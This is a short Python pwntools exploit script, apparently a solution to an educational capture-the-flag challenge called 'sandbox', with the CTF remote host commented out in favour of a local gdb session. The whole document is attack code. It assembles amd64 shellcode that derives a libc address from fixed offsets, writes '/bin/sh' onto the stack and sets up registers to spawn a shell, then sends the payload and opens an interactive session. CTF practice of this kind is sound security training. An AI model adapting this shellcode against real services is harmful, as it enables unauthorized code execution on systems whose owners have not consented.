#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = remote("edu-ctf.zoolab.org", 30202)
r = gdb.debug("./sandbox", """
b *main+968
c
""")

sc = asm(f"""
call rcx
add r8, 11310
mov rcx, [r8]
sub rcx, 174336
mov qword ptr [rsp], rcx

mov rdx, 0x68732f6e69622f
mov qword ptr [rsp+8], rdx

lea rdi, [rsp+8]
mov rsi, 0
mov rdx, 0
ret
""")
print(sc, len(sc))

r.send(sc)

r.interactive()